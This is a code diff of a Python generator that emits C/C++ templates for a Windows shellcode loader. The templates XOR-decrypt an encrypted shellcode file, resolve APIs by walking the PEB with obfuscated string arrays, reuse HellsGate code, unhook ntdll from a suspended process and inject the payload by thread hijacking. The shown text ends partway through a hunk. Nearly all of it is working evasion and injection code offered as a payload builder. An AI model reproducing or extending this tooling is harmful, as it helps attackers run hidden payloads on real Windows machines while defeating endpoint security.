@@ -3,116 +3,212 @@ import string
 import os
 import argparse
 
-template = """#include <windows.h>
+
+functions_cpp_template = """#include <windows.h>
 #include <stdio.h>
 #include "addresshunter.h"
+#include "functions.h"
+
+//Kernel32 Function
+UINT64 kernel32dll = 0;
+CreateProcessA_t CreateProcessAFunc = 0;
+TerminateProcess_t TerminateProcessFunc = 0;
+CloseHandle_t CloseHandleFunc = 0;
+CreateFileA_t CreateFileAFunc = 0;
+GetFileSize_t GetFileSizeFunc = 0;
+ReadFile_t ReadFileFunc = 0;
+GetThreadContext_t GetThreadContextFunc = 0;
+SetThreadContext_t SetThreadContextFunc = 0;
+Sleep_t SleepFunc = 0;
+ResumeThread_t ResumeThreadFunc = 0;
+LOADLIBRARYA LoadLibraryAFunc = 0;
+
+//Nt Functions
+HMODULE ntdlldll = 0;
+NtAllocateVirtualMemory_t NtAllocateVirtualMemoryFunc = 0;
+NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = 0;
+NtWriteVirtualMemroy_t NtWriteVirtualMemroyFunc = 0;
+NtReadVirtualMemory_t NtReadVirtualMemoryFunc = 0;
+
+wprintf_t wprintfFunc = 0;
+
+void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
+	int j;
+
+	j = 0;
+	for (int i = 0; i < data_len; i++) {
+		if (j == key_len - 1) j = 0;
+
+		data[i] = data[i] ^ key[j];
+		j++;
+	}
+}
+
+void sleep()
+{
+	for (int i = 0; i <= 500000; i++)
+	{
+		for (int j = 2; j <= i / 2; j++)
+		{
+			if (i % j == 0)
+			{
+				break;
+			}
+		}
+	}
+}
+
+PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
+{
+	PBYTE D = (PBYTE)Destination;
+	PBYTE S = (PBYTE)Source;
+
+	while (Length--)
+		*D++ = *S++;
+
+	return Destination;
+}
+
+char* strstrFunc(const char* string, const char* substring)
+{
+	const char* a, * b;
+
+	/* First scan quickly through the two strings looking for a
+	 * single-character match.  When it's found, then compare the
+	 * rest of the substring.
+	 */
+
+	b = substring;
+
+	if (*b == 0)
+	{
+		return (char*)string;
+	}
+
+	for (; *string != 0; string += 1)
+	{
+		if (*string != *b)
+		{
+			continue;
+		}
+
+		a = string;
+
+		while (1)
+		{
+			if (*b == 0)
+			{
+				return (char*)string;
+			}
+			if (*a++ != *b++)
+			{
+				break;
+			}
+		}
+
+		b = substring;
+	}
+
+	return NULL;
+}
+
+PVOID GetDll(PWSTR FindName)
+{
+	_PPEB ppeb = (_PPEB)__readgsqword(0x60);
+	ULONG_PTR pLdr = (ULONG_PTR)ppeb->pLdr;
+	ULONG_PTR val1 = (ULONG_PTR)((PPEB_LDR_DATA)pLdr)->InMemoryOrderModuleList.Flink;
+	PVOID dllBase = NULL;
+
+	ULONG_PTR val2;
+	while (val1)
+	{
+		PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
+		dllBase = (PVOID)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
+		if (my_strcmp((char*)FindName, (char*)DllName) == 0)
+		{
+			break;
+		}
+		val1 = DEREF_64(val1);
+	}
+	return dllBase;
+}
+
+void LoadFunctionsAfterUnhooking() {
+
+	CHAR NtAllocateVirtualMemory_c[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
+	CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
+	CHAR NtWriteVirtualMemroy_c[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
+	CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
+	CHAR NtReadVirtualMemeory_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
+	CHAR CreateProcessA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
+	CHAR TerminateProcess_c[] = { 'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00 };
+	CHAR CloseHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x00 };
+	CHAR CreateFileA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x00 };
+	CHAR GetFileSize_c[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x00 };
+	CHAR ReadFile_c[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x00 };
+	CHAR GetThreadContext_c[] = { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
+	CHAR SetThreadContext_c[] = { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
+	CHAR ResumeThread_c[] = { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x00 };
+	CHAR Sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0x00 };
+
+
+
+	kernel32dll = GetKernel32();
+	//Kernel32 Function
+	CreateProcessAFunc = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateProcessA_c);
+	TerminateProcessFunc = (TerminateProcess_t)GetSymbolAddress((HANDLE)kernel32dll, TerminateProcess_c);
+	CloseHandleFunc = (CloseHandle_t)GetSymbolAddress((HANDLE)kernel32dll, CloseHandle_c);
+	CreateFileAFunc = (CreateFileA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateFileA_c);
+	GetFileSizeFunc = (GetFileSize_t)GetSymbolAddress((HANDLE)kernel32dll, GetFileSize_c);
+	ReadFileFunc = (ReadFile_t)GetSymbolAddress((HANDLE)kernel32dll, ReadFile_c);
+	GetThreadContextFunc = (GetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, GetThreadContext_c);
+	SetThreadContextFunc = (SetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, SetThreadContext_c);
+	SleepFunc = (Sleep_t)GetSymbolAddress((HANDLE)kernel32dll, Sleep_c);
+	ResumeThreadFunc = (ResumeThread_t)GetSymbolAddress((HANDLE)kernel32dll, ResumeThread_c);
+	LoadLibraryAFunc = (LOADLIBRARYA)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
+
+	//Nt Functions
+	ntdlldll = LoadLibraryAFunc("ntdll.dll");
+	NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtAllocateVirtualMemory_c);
+	NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);
+	NtWriteVirtualMemroyFunc = (NtWriteVirtualMemroy_t)GetSymbolAddress((HANDLE)ntdlldll, NtWriteVirtualMemroy_c);
+	NtReadVirtualMemoryFunc = (NtReadVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtReadVirtualMemeory_c);
+
+
+}
+
+void LoadFunctionBeforeUnhooking() {
+	CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00 };
+	CHAR CreateProcessA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
+	CHAR NtAllocateVirtualMemory_c[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
+	CHAR NtReadVirtualMemeory_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
+	CHAR TerminateProcess_c[] = { 'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00 };
+	CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
+	CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
+	CHAR CloseHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x00 };
+
+	kernel32dll = GetKernel32();
+	LoadLibraryAFunc = (LOADLIBRARYA)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
+	ntdlldll = LoadLibraryAFunc("ntdll.dll");
+
+	CreateProcessAFunc = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateProcessA_c);
+	CloseHandleFunc = (CloseHandle_t)GetSymbolAddress((HANDLE)kernel32dll, CloseHandle_c);
+	wprintfFunc = (wprintf_t)GetSymbolAddress((HANDLE)LoadLibraryAFunc("msvcrt.dll"), wprintf_c);
+	NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtAllocateVirtualMemory_c);
+	NtReadVirtualMemoryFunc = (NtReadVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtReadVirtualMemeory_c);
+	TerminateProcessFunc = (TerminateProcess_t)GetSymbolAddress((HANDLE)kernel32dll, TerminateProcess_c);
+	NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);
+
+}"""
+
+template = """#include <windows.h>
+#include <stdio.h>
 #include "functions.h"
 
 #define STATUS_SUCCESS 0
 #define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
 
 char KEY[] = "XOR_KEY_PLACEHOLDER";
-
-void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
-    int j;
-
-    j = 0;
-    for (int i = 0; i < data_len; i++) {
-        if (j == key_len - 1) j = 0;
-
-        data[i] = data[i] ^ key[j];
-        j++;
-    }
-}
-
-void sleep()
-{
-    for (int i = 0; i <= 500000; i++)
-    {
-        for (int j = 2; j <= i / 2; j++)
-        {
-            if (i % j == 0)
-            {
-                break;
-            }
-        }
-    }
-}
-
-PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
-{
-    PBYTE D = (PBYTE)Destination;
-    PBYTE S = (PBYTE)Source;
-
-    while (Length--)
-        *D++ = *S++;
-
-    return Destination;
-}
-
-char* strstrFunc(const char* string, const char* substring)
-{
-    const char* a, * b;
-
-    /* First scan quickly through the two strings looking for a
-     * single-character match.  When it's found, then compare the
-     * rest of the substring.
-     */
-
-    b = substring;
-
-    if (*b == 0)
-    {
-        return (char*)string;
-    }
-
-    for (; *string != 0; string += 1)
-    {
-        if (*string != *b)
-        {
-            continue;
-        }
-
-        a = string;
-
-        while (1)
-        {
-            if (*b == 0)
-            {
-                return (char*)string;
-            }
-            if (*a++ != *b++)
-            {
-                break;
-            }
-        }
-
-        b = substring;
-    }
-
-    return NULL;
-}
-
-PVOID GetDll(PWSTR FindName)
-{
-    _PPEB ppeb = (_PPEB)__readgsqword(0x60);
-    ULONG_PTR pLdr = (ULONG_PTR)ppeb->pLdr;
-    ULONG_PTR val1 = (ULONG_PTR)((PPEB_LDR_DATA)pLdr)->InMemoryOrderModuleList.Flink;
-    PVOID dllBase = NULL;
-
-    ULONG_PTR val2;
-    while (val1)
-    {
-        PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
-        dllBase = (PVOID)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
-        if (my_strcmp((char*)FindName, (char*)DllName) == 0)
-        {
-            break;
-        }
-        val1 = DEREF_64(val1);
-    }
-    return dllBase;
-}
 
 //Following functions are copied from HellsGate : https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c
 
@@ -180,32 +276,18 @@ PVOID GetTableEntry(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirecto
 
 DWORD protectingMe(PVOID textBase, DWORD flProtect, SIZE_T size)
 {
-    UINT64 kernel32dll;
     DWORD oldprotect = NULL;
 
-    CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
-    CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
-    kernel32dll = GetKernel32();
-    LoadLibraryA_t LoadLibraryAFunc = (LoadLibraryA_t)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
-    HMODULE ntdlldll = LoadLibraryAFunc("ntdll.dll");
-
-    NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);
-
-    NtProtectVirtualMemoryFunc(NtCurrentProcess(), &textBase, (PULONG)&size, flProtect, &oldprotect);
-    return oldprotect;
+    NTSTATUS status = NtProtectVirtualMemoryFunc(NtCurrentProcess(), &textBase, (PULONG)&size, flProtect, &oldprotect);
+    if (status == STATUS_SUCCESS) {
+        return oldprotect;
+    }
+    return NULL;
 }
 
 void WhatsOverwriting(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PIMAGE_SECTION_HEADER textsection)
 {
-    UINT64 msvcrtdll, LoadLibraryAFunc, kernel32dll;
-    kernel32dll = GetKernel32();
-    CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
-    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x00 };
-
-    LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
-    msvcrtdll = (UINT64)((LoadLibraryA_t)LoadLibraryAFunc)(msvcrt_c);
-
-
+    
     PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfFunctions);
     PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNames);
     PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNameOrdinals);
@@ -251,51 +333,11 @@ void SomeReplacing(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_SECTION_HEADER 
 
 
 extern "C" void exec() {
-
-    // Function names
-    CHAR NtAllocateVirtualMemory_c[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
-    CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
-    CHAR NtWriteVirtualMemroy_c[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
-    CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
-    CHAR NtReadVirtualMemeory_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
-    CHAR CreateProcessA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
-    CHAR TerminateProcess_c[] = {'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00};
-    CHAR CloseHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x00 };
-    CHAR CreateFileA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x00 };
-    CHAR GetFileSize_c[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x00 };
-    CHAR ReadFile_c[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x00 };
-    CHAR GetThreadContext_c[] = { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
-    CHAR SetThreadContext_c[] = { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
-    CHAR ResumeThread_c[] = { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x00 };
-    CHAR Sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0x00 };
-    CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00 };
     
-    NTSTATUS status = NULL;
-
-    UINT64 kernel32dll = GetKernel32();
-    //Kernel32 Function
-    CreateProcessA_t CreateProcessAFunc = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateProcessA_c);
-    TerminateProcess_t TerminateProcessFunc = (TerminateProcess_t)GetSymbolAddress((HANDLE)kernel32dll, TerminateProcess_c);
-    CloseHandle_t CloseHandleFunc = (CloseHandle_t)GetSymbolAddress((HANDLE)kernel32dll, CloseHandle_c);
-    CreateFileA_t CreateFileAFunc = (CreateFileA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateFileA_c);
-    GetFileSize_t GetFileSizeFunc = (GetFileSize_t)GetSymbolAddress((HANDLE)kernel32dll, GetFileSize_c);
-    ReadFile_t ReadFileFunc = (ReadFile_t)GetSymbolAddress((HANDLE)kernel32dll, ReadFile_c);
-    GetThreadContext_t GetThreadContextFunc = (GetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, GetThreadContext_c);
-    SetThreadContext_t SetThreadContextFunc = (SetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, SetThreadContext_c);
-    Sleep_t SleepFunc = (Sleep_t)GetSymbolAddress((HANDLE)kernel32dll, Sleep_c);
-    ResumeThread_t ResumeThreadFunc = (ResumeThread_t)GetSymbolAddress((HANDLE)kernel32dll, ResumeThread_c);
-
-    //Nt Functions
-    LoadLibraryA_t LoadLibraryAFunc = (LoadLibraryA_t)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
-    HMODULE ntdlldll = LoadLibraryAFunc("ntdll.dll");
-    NtAllocateVirtualMemory_t NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtAllocateVirtualMemory_c);
-    NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);
-    NtWriteVirtualMemroy_t NtWriteVirtualMemroyFunc = (NtWriteVirtualMemroy_t)GetSymbolAddress((HANDLE)ntdlldll, NtWriteVirtualMemroy_c);
-    NtReadVirtualMemory_t NtReadVirtualMemoryFunc = (NtReadVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtReadVirtualMemeory_c);
-
-    //msvcrt Function
-    wprintf_t wprintfFunc = (wprintf_t)GetSymbolAddress((HANDLE)LoadLibraryAFunc("msvcrt.dll"), wprintf_c);
-
+    // Function names
+	NTSTATUS status = NULL;
+    LoadFunctionBeforeUnhooking();
+   
     // ntdll unhooking
     STARTUPINFO siSuspended;
     PROCESS_INFORMATION piSuspended;
@@ -369,7 +411,9 @@ extern "C" void exec() {
     WCHAR finishedReplace[] = { L'[', L'+', L']', L' ', L'F', L'i', L'n', L'i', L's', L'h', L'e', L'd', L' ', L'r', L'e', L'p', L'l', L'a', L'c', L'e', L' ', L'n', L't', L'd', L'l', L'l', L' ', L'f', L'r', L'o', L'm', L' ', L's', L'u', L's', L'p', L'e', L'n', L'd', L'e', L'd', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's',  L'\\n', 0x00 };
     wprintfFunc(finishedReplace);
 
-    // Process Hollowing
+    LoadFunctionsAfterUnhooking();
+
+    // Thread Hijacking
     HANDLE hFile = CreateFileAFunc(
         "OUTPUT_PLACEHOLDER", // change it to the file name of the encrypted shellcode
         GENERIC_READ | GENERIC_WRITE,
@@ -540,114 +584,12 @@ extern "C" void exec() {
 
 template_dll = """#include <windows.h>
 #include <stdio.h>
-#include "addresshunter.h"
 #include "functions.h"
 
 #define STATUS_SUCCESS 0
 #define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
 
 char KEY[] = "XOR_KEY_PLACEHOLDER";
-
-void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
-    int j;
-
-    j = 0;
-    for (int i = 0; i < data_len; i++) {
-        if (j == key_len - 1) j = 0;
-
-        data[i] = data[i] ^ key[j];
-        j++;
-    }
-}
-
-void sleep()
-{
-    for (int i = 0; i <= 500000; i++)
-    {
-        for (int j = 2; j <= i / 2; j++)
-        {
-            if (i % j == 0)
-            {
-                break;
-            }
-        }
-    }
-}
-
-PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
-{
-    PBYTE D = (PBYTE)Destination;
-    PBYTE S = (PBYTE)Source;
-
-    while (Length--)
-        *D++ = *S++;
-
-    return Destination;
-}
-
-char* strstrFunc(const char* string, const char* substring)
-{
-    const char* a, * b;
-
-    /* First scan quickly through the two strings looking for a
-     * single-character match.  When it's found, then compare the
-     * rest of the substring.
-     */
-
-    b = substring;
-
-    if (*b == 0)
-    {
-        return (char*)string;
-    }
-
-    for (; *string != 0; string += 1)
-    {
-        if (*string != *b)
-        {
-            continue;
-        }
-
-        a = string;
-
-        while (1)
-        {
-            if (*b == 0)
-            {
-                return (char*)string;
-            }
-            if (*a++ != *b++)
-            {
-                break;
-            }
-        }
-
-        b = substring;
-    }
-
-    return NULL;
-}
-
-PVOID GetDll(PWSTR FindName)
-{
-    _PPEB ppeb = (_PPEB)__readgsqword(0x60);
-    ULONG_PTR pLdr = (ULONG_PTR)ppeb->pLdr;
-    ULONG_PTR val1 = (ULONG_PTR)((PPEB_LDR_DATA)pLdr)->InMemoryOrderModuleList.Flink;
-    PVOID dllBase = NULL;
-
-    ULONG_PTR val2;
-    while (val1)
-    {
-        PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
-        dllBase = (PVOID)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
-        if (my_strcmp((char*)FindName, (char*)DllName) == 0)
-        {
-            break;
-        }
-        val1 = DEREF_64(val1);
-    }
-    return dllBase;
-}
 
 //Following functions are copied from HellsGate : https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c
 
@@ -715,32 +657,18 @@ PVOID GetTableEntry(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirecto
 
 DWORD protectingMe(PVOID textBase, DWORD flProtect, SIZE_T size)
 {
-    UINT64 kernel32dll;
     DWORD oldprotect = NULL;
 
-    CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
-    CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
-    kernel32dll = GetKernel32();
-    LoadLibraryA_t LoadLibraryAFunc = (LoadLibraryA_t)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
-    HMODULE ntdlldll = LoadLibraryAFunc("ntdll.dll");
-
-    NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);
-
-    NtProtectVirtualMemoryFunc(NtCurrentProcess(), &textBase, (PULONG)&size, flProtect, &oldprotect);
-    return oldprotect;
+    NTSTATUS status = NtProtectVirtualMemoryFunc(NtCurrentProcess(), &textBase, (PULONG)&size, flProtect, &oldprotect);
+    if (status == STATUS_SUCCESS) {
+        return oldprotect;
+    }
+    return NULL;
 }
 
 void WhatsOverwriting(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PIMAGE_SECTION_HEADER textsection)
 {
-    UINT64 msvcrtdll, LoadLibraryAFunc, kernel32dll;
-    kernel32dll = GetKernel32();
-    CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
-    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x00 };
-
-    LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
-    msvcrtdll = (UINT64)((LoadLibraryA_t)LoadLibraryAFunc)(msvcrt_c);
-
-
+    
     PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfFunctions);
     PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNames);
     PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNameOrdinals);
@@ -786,51 +714,11 @@ void SomeReplacing(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_SECTION_HEADER 
 
 
 extern "C" void exec() {
-
-    // Function names
-    CHAR NtAllocateVirtualMemory_c[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
-    CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
-    CHAR NtWriteVirtualMemroy_c[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
-    CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
-    CHAR NtReadVirtualMemeory_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
-    CHAR CreateProcessA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
-    CHAR TerminateProcess_c[] = {'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00};
-    CHAR CloseHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x00 };
-    CHAR CreateFileA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x00 };
-    CHAR GetFileSize_c[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x00 };
-    CHAR ReadFile_c[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x00 };
-    CHAR GetThreadContext_c[] = { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
-    CHAR SetThreadContext_c[] = { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
-    CHAR ResumeThread_c[] = { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x00 };
-    CHAR Sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0x00 };
-    CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00 };
     
-    NTSTATUS status = NULL;
-
-    UINT64 kernel32dll = GetKernel32();
-    //Kernel32 Function
-    CreateProcessA_t CreateProcessAFunc = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateProcessA_c);
-    TerminateProcess_t TerminateProcessFunc = (TerminateProcess_t)GetSymbolAddress((HANDLE)kernel32dll, TerminateProcess_c);
-    CloseHandle_t CloseHandleFunc = (CloseHandle_t)GetSymbolAddress((HANDLE)kernel32dll, CloseHandle_c);
